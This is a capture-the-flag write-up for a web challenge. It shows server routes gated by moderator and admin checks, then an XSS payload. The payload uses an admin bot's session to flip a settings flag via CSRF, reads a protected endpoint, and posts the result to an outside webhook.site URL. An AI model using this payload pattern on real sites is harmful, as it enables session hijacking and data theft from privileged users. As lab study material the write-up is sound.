## Initial Reconnaissance: Finding the Flag's Location
The `server/main.py` source code indicates that `FLAG_STAGE_4` can be extracted by going to the `/development` endpoint.
```python
@app.route('/development', methods=['GET'])
@login_required
@moderator_required
@development_routes_required
def development():
    return FLAG_STAGE_4, 200
```

We already have moderator privileges and need to pass `@development_routes_required`
```python
@app.route('/settings', methods=['POST'])
@login_required
@admin_required
def settings():
    show_dev_routes = request.json.get('show_development_routes', False)
    global SHOW_DEVELOPMENT_ROUTES
    SHOW_DEVELOPMENT_ROUTES = show_dev_routes
    flash('Settings updated', 'success')
    return "Settings updated", 200
```
## XSS and CSRF
Which can be done using XSS and bot's admin privileges (like in `intro web 3`).
Let's write the payload:
```html
<script>
    async function getFlag4() {
        try {
            await fetch('/settings', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({show_development_routes: true})
            });

            const response = await fetch('/development');
            const flag4 = await response.text();

            fetch('https://webhook.site/ae28ff10-cd3d-4879-a457-4a9ef68b0362', {
                method: 'POST',
                mode: 'no-cors',
                body: 'SUCCESS! Flag 4: ' + flag4
            });

        } catch (error) {
            fetch('https://webhook.site/ae28ff10-cd3d-4879-a457-4a9ef68b0362', {
                method: 'POST',
                mode: 'no-cors',
                body: 'ERROR: ' + error.toString()
            });
        }
    }
  
    getFlag4();
</script>
```

Listener receives: `SUCCESS! Flag 4: GPNCTF{some_flag}`


